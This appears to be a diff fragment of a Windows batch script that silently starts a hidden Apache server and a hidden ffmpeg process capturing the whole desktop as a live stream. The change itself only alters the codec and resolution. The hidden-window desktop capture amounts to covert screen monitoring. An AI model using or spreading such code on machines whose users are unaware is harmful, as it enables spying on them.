@@ -52,7 +52,7 @@ tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe")
 
 tasklist /fi "imagename eq ffmpeg.exe" | find /i "ffmpeg.exe" > nul
-if not errorlevel 1 (echo.) else (powershell "start cmd.exe -Args \"/K %environment%\ffmpeg.exe -f gdigrab -i desktop -vcodec vc2 -f ssegment -segment_list %temp%\playlist.m3u8 -segment_list_flags +live -segment_time 1 -segment_wrap 1 %temp%\out%%03d.ts\" -WindowStyle Hidden")
+if not errorlevel 1 (echo.) else (powershell "start cmd.exe -Args \"/K %environment%\ffmpeg.exe -f gdigrab -i desktop -vf scale=320:-1 -vcodec mpeg1video -f ssegment -segment_list %temp%\playlist.m3u8 -segment_list_flags +live -segment_time 1 -segment_wrap 1 %temp%\out%%03d.ts\" -WindowStyle Hidden")
 
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (more +2 "%environment%\apache2\conf\httpd.conf" > "%environment%\apache2\conf\httpd.txt" && move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf")
